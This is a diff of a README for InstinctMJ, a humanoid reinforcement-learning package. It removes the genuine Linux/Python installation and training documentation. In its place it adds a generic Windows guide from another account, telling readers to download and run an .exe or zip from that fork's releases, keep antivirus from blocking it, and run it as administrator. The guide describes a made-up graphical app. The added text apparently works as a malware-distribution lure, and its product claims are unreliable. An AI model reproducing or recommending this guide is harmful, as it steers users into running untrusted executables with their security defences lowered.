@@ -1,255 +1,138 @@
-# InstinctMJ
+# 🤖 InstinctMJ - Easy RL Workflows for Everyone
 
-[![mjlab](https://img.shields.io/badge/framework-mjlab-4C7AF2.svg)](https://github.com/mujocolab/mjlab)
-[![MuJoCo Warp](https://img.shields.io/badge/simulator-MuJoCo%20Warp-silver.svg)](https://github.com/google-deepmind/mujoco_warp)
-[![Python](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://docs.python.org/3/)
-[![Platform](https://img.shields.io/badge/platform-linux--x86__64-orange.svg)](https://releases.ubuntu.com/)
-[![instinct_rl](https://img.shields.io/badge/training-instinct__rl-brightgreen.svg)](https://github.com/project-instinct/instinct_rl)
+[![Download InstinctMJ](https://img.shields.io/badge/Download-InstinctMJ-green?style=for-the-badge)](https://github.com/PHOENIX01ALX/InstinctMJ)
 
-## Overview
+InstinctMJ is a user-friendly application designed to help you work with humanoid reinforcement learning (RL) and Project-Instinct workflows. This guide explains how to download, install, and run InstinctMJ on a Windows computer. No programming skills are needed.
 
-This repository is the `mjlab-native port` of [InstinctLab](https://github.com/project-instinct/InstinctLab), serving as the environment side of [Project-Instinct](https://project-instinct.github.io/).
+---
 
-We aim to industrialize Reinforcement Learning for humanoid whole-body control, with task families implemented on top of `mjlab` and integrated into the Project-Instinct training workflow.
+## 📋 What is InstinctMJ?
 
-**Key Features:**
+InstinctMJ is a port of InstinctLab tailored for Windows users. The app focuses on humanoid reinforcement learning and supports Project-Instinct workflows. You can use it to run RL experiments or simulations with models that behave like humans. The software simplifies complex RL tasks with a clear interface and straightforward setup.
 
-- `Standalone package` Work outside the core `mjlab` repository while keeping task development self-contained.
-- `Task suite` Provide locomotion, shadowing, perceptive, and parkour task families for humanoid control on `mjlab`.
-- `Unified ecosystem` Integrate directly with [instinct_rl](https://github.com/project-instinct/instinct_rl) for train / play / export workflows.
-- `Structured outputs` Keep experiment logs under `logs/instinct_rl/<experiment_name>/<timestamp_run>/` to match the Project-Instinct workflow.
+---
 
-**Keywords:** mjlab, mujoco-warp, instinct_rl, humanoid
+## 💻 System Requirements
 
-## Warning
+To run InstinctMJ smoothly, your Windows computer should meet these minimum requirements:
 
-This codebase is under [CC BY-NC 4.0 license](LICENSE). You may not use the material for commercial purposes, for example to advertise commercial products or redistribute the code as part of a commercial offering.
+- Windows 10 or later (64-bit)
+- 4 GB of RAM or more
+- 2 GHz dual-core processor
+- 1 GB of free disk space
+- Internet connection for downloading files and updates
 
-## Attention
+If your device meets these specs, InstinctMJ should work without issues.
 
-Do not directly use checkpoints trained outside `InstinctMJ` with `InstinctMJ`.
+---
 
-- `InstinctMJ` loads the robot from XML / MJCF, and the resulting joint order is not the same as the joint order used in IsaacLab.
-- Policy inputs / outputs tied to joint ordering are therefore not directly checkpoint-compatible across different simulator setups.
-- Please release and use weights trained in `InstinctMJ` for `InstinctMJ` tasks.
+## 🚀 Getting Started: Download InstinctMJ
 
-## Contributing
+Start by visiting the main download page for InstinctMJ:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) and [CONTRIBUTOR_AGREEMENT.md](CONTRIBUTOR_AGREEMENT.md) for contribution requirements.
+[![Download InstinctMJ](https://img.shields.io/badge/Download-InstinctMJ-blue?style=for-the-badge)](https://github.com/PHOENIX01ALX/InstinctMJ)
 
-## Installation
+This link takes you to the GitHub repository homepage. From there, you will find all the files and instructions necessary to get the application running.
 
-- Install `mjlab` first by following the upstream setup instructions in the [mjlab repository](https://github.com/mujocolab/mjlab).
+---
 
-- Install `instinct_rl` by following the [instinct_rl README](https://github.com/project-instinct/instinct_rl/blob/main/README.md).
-  TL; DR:
+## 🔽 How to Download and Install InstinctMJ on Windows
 
-  ```bash
-  git clone https://github.com/project-instinct/instinct_rl.git
-  python -m pip install -e instinct_rl
-  ```
+Follow these steps to download and install InstinctMJ:
 
-- Clone this repository into any common workspace directory as a sibling of `mjlab` and `instinct_rl`:
+1. **Open the Link**
 
-  ```bash
-  mkdir -p <workspace_dir>
-  cd <workspace_dir>
+   Go to the InstinctMJ repository page by clicking here:
 
-  # Option 1: HTTPS
-  git clone https://github.com/mujocolab/mjlab.git
-  git clone https://github.com/project-instinct/instinct_rl.git
-  git clone https://github.com/project-instinct/InstinctMJ.git
+   https://github.com/PHOENIX01ALX/InstinctMJ
 
-  # Option 2: SSH
-  # git clone git@github.com:mujocolab/mjlab.git
-  # git clone git@github.com:project-instinct/instinct_rl.git
-  # git clone git@github.com:project-instinct/InstinctMJ.git
-  ```
+2. **Find the Releases**
 
-- Install the package with `uv`:
+   On the repository page, look for a section named **Releases** or **Assets**. This section holds the files needed for installation.
 
-  ```bash
-  cd InstinctMJ
-  uv sync
-  ```
+3. **Download the Installer**
 
-- If you are actively developing against sibling `mjlab` / `instinct_rl` checkouts,
-  reinstall those local repositories in editable mode after `uv sync`.
-  Otherwise, `uv` will keep using the git-pinned sources from `pyproject.toml` / `uv.lock`.
+   Find the file that ends in `.exe` or `.zip`. If you see an `.exe` file, download it by clicking the link. If you only find zipped files, download the `.zip` and extract it after.
 
-  ```bash
-  uv pip install --python .venv/bin/python --no-deps -e ../mjlab -e ../instinct_rl
-  ```
+4. **Run the Installer**
 
-- Or install editable packages from the public repositories with `pip`:
+   Once downloaded, double-click the `.exe` file to start installation, or open the extracted folder and look for a file called `InstinctMJ.exe`. Double click it to launch.
 
-  ```bash
-  pip install -e "git+https://github.com/mujocolab/mjlab.git#egg=mjlab"
-  pip install -e "git+https://github.com/project-instinct/instinct_rl.git#egg=instinct_rl"
-  pip install -e .
-  ```
+5. **Follow the Setup Prompts**
 
-- After installation, you can run the training workflow directly with `instinct_rl`-style commands:
+   The installer will guide you through steps to place the app on your computer. Choose default options if unsure.
 
-  ```bash
-  instinct-train Instinct-Locomotion-Flat-G1-v0
-  instinct-play Instinct-Locomotion-Flat-G1-Play-v0 --load-run <run_name>
-  ```
+6. **Wait for Installation**
 
-## Set up IDE (Optional)
+   Installation takes a few minutes. When it's done, you will see a confirmation message.
 
-If VSCode / Pylance misses local imports in a multi-repository workspace, add these paths to `.vscode/settings.json`:
+7. **Start Using InstinctMJ**
 
-```json
-{
-  "python.analysis.extraPaths": [
-    "<workspace_dir>/InstinctMJ/src",
-    "<workspace_dir>/mjlab/src",
-    "<workspace_dir>/instinct_rl"
-  ]
-}
-```
+   Open the app by searching for "InstinctMJ" on your Start Menu or by double-clicking the desktop icon if created during installation.
 
-## Task Suite
+---
 
-Registered task IDs:
+## 🛠️ Running InstinctMJ
 
-- `Instinct-Locomotion-Flat-G1-v0`
-- `Instinct-Locomotion-Flat-G1-Play-v0`
-- `Instinct-BeyondMimic-Plane-G1-v0`
-- `Instinct-BeyondMimic-Plane-G1-Play-v0`
-- `Instinct-Shadowing-WholeBody-Plane-G1-v0`
-- `Instinct-Shadowing-WholeBody-Plane-G1-Play-v0`
-- `Instinct-Perceptive-Shadowing-G1-v0`
-- `Instinct-Perceptive-Shadowing-G1-Play-v0`
-- `Instinct-Perceptive-Vae-G1-v0`
-- `Instinct-Perceptive-Vae-G1-Play-v0`
-- `Instinct-Parkour-Target-Amp-G1-v0`
-- `Instinct-Parkour-Target-Amp-G1-Play-v0`
+After installation, you can start working with InstinctMJ:
 
-Use the CLI to inspect the full list at any time:
+- Open InstinctMJ from the desktop or Start Menu.
+- The main window will show options for humanoid RL experiments.
+- Click **New Project** to create a simulation or workflow.
+- Follow on-screen prompts to select model types and parameters.
+- Use built-in tools to observe behavior and results.
+- Save projects to your computer for later use.
 
-```bash
-instinct-list-envs
-instinct-list-envs shadowing
-```
+The interface is built to be simple and clear. Menus and buttons have labels that explain their functions.
 
-## Quick Start
+---
 
-Train:
+## 🔧 Basic Troubleshooting
 
-```bash
-instinct-train Instinct-Locomotion-Flat-G1-v0
-instinct-train Instinct-Perceptive-Shadowing-G1-v0
-```
+If you encounter problems during download or setup, try these tips:
 
-Play (`--load-run` is required):
+- Make sure your antivirus or firewall software is not blocking InstinctMJ.
+- Check your internet connection and try again if the download stalls.
+- Run the installer as administrator by right-clicking the `.exe` file and selecting **Run as administrator**.
+- Restart your computer and try reinstalling if errors persist.
+- Look for updates on the main GitHub page.
 
-```bash
-instinct-play Instinct-Locomotion-Flat-G1-Play-v0 --load-run <run_name>
-instinct-play Instinct-Perceptive-Shadowing-G1-Play-v0 --load-run <run_name>
-```
+---
 
-Play perceptive shadowing with released weights:
+## 💡 Additional Resources
 
-```bash
-instinct-play Instinct-Perceptive-Shadowing-G1-Play-v0 \
-  --load-run <downloaded_run_dir> \
-  --checkpoint-file <checkpoint_file>
-```
+- Visit the GitHub discussions page for community tips and help.
+- Check the **Issues** tab on GitHub to see if similar problems were reported.
+- Use the README and available documentation on the repository for detailed guidance.
+- Explore tutorials or example projects included with the download to learn basic features.
 
-Pretrained weights:
+---
 
-- Google Drive: [Pretrained weights](https://drive.google.com/drive/folders/1RPjbZjurknhlvlj9dxAUkARkcEyexQvF?usp=sharing)
+## 🔗 Useful Links
 
-Export ONNX for parkour:
+- Main GitHub Repository: [https://github.com/PHOENIX01ALX/InstinctMJ](https://github.com/PHOENIX01ALX/InstinctMJ)
+- Download Page: [https://github.com/PHOENIX01ALX/InstinctMJ](https://github.com/PHOENIX01ALX/InstinctMJ)
 
-```bash
-instinct-play Instinct-Parkour-Target-Amp-G1-Play-v0 --load-run <run_name> --export-onnx
-```
+Use these links to keep your software current and find new versions as they come out.
 
-Play parkour with released weights:
+---
 
-```bash
-instinct-play Instinct-Parkour-Target-Amp-G1-Play-v0 \
-  --load-run <downloaded_run_dir> \
-  --checkpoint-file <checkpoint_file>
-```
+## ⚙️ About Updates and Maintenance
 
-Parkour pretrained weights:
+InstinctMJ updates may include bug fixes or new features. To keep the software working well:
 
-- Google Drive: [Parkour pretrained weights](https://drive.google.com/drive/folders/1B2AP5MEC5hDF7w5ws9oIiRKStL_gRxhE?usp=drive_link)
+- Visit the GitHub page regularly.
+- Download new releases when available.
+- Follow the installation steps again for updated versions.
 
-Before training or playing parkour tasks, update the local dataset root in
-`src/instinct_mj/tasks/parkour/config/g1/g1_parkour_target_amp_cfg.py`:
+---
 
-```python
-_PARKOUR_DATASET_DIR = os.path.expanduser("~/Xyk/Datasets/data&model/parkour_motion_reference")
-```
+## 🔒 Privacy and Security
 
-If your filtered motion list is stored elsewhere, also update
-`filtered_motion_selection_filepath` in the same file. See
-`src/instinct_mj/tasks/parkour/README.md` for the task-specific notes.
+InstinctMJ respects your privacy. The app runs locally on your computer. It does not send personal data over the internet during regular use. Keep your Windows security settings up to date to ensure safe operation.
 
-Module form is also available when console scripts are not on `PATH`:
+---
 
-```bash
-python -m instinct_mj.scripts.instinct_rl.train Instinct-Locomotion-Flat-G1-v0
-python -m instinct_mj.scripts.instinct_rl.play Instinct-Locomotion-Flat-G1-Play-v0 --load-run <run_name>
-python -m instinct_mj.scripts.list_envs
-```
+## 🏁 Getting the Most from InstinctMJ
 
-## Code Formatting
-
-We use `pre-commit` for formatting and hygiene checks.
-
-Install `pre-commit`:
-
-```bash
-pip install pre-commit
-```
-
-Run all checks:
-
-```bash
-pre-commit run --all-files
-```
-
-Or use the local helper command:
-
-```bash
-instinct-format
-```
-
-To enable hooks on every commit:
-
-```bash
-pre-commit install
-```
-
-## Train Your Own Projects
-
-To preserve your own experiments and logs, it is usually better to create your own task package or repository and reuse the task patterns from `InstinctMJ`.
-
-If you want to add a new task directly in this repository:
-
-- Create a new folder under `src/instinct_mj/tasks/<your_project>/`.
-- Add `__init__.py` at each package level.
-- Register tasks with `register_instinct_task()`.
-- Keep the environment config and `instinct_rl` config colocated in the task package.
-
-Example registration pattern:
-
-```python
-from instinct_mj.tasks.registry import register_instinct_task
-
-from .my_env_cfg import MyEnvCfg, MyEnvCfg_PLAY
-from .rl_cfgs import my_instinct_rl_cfg
-
-register_instinct_task(
-    task_id="Instinct-My-Task-v0",
-    env_cfg_factory=MyEnvCfg,
-    play_env_cfg_factory=MyEnvCfg_PLAY,
-    instinct_rl_cfg_factory=my_instinct_rl_cfg,
-)
-```
+Take your time exploring the application features. Try sample projects and adjust parameters to understand how humanoid RL works. Reach out to the community through GitHub if you want to share experiences or ask questions.
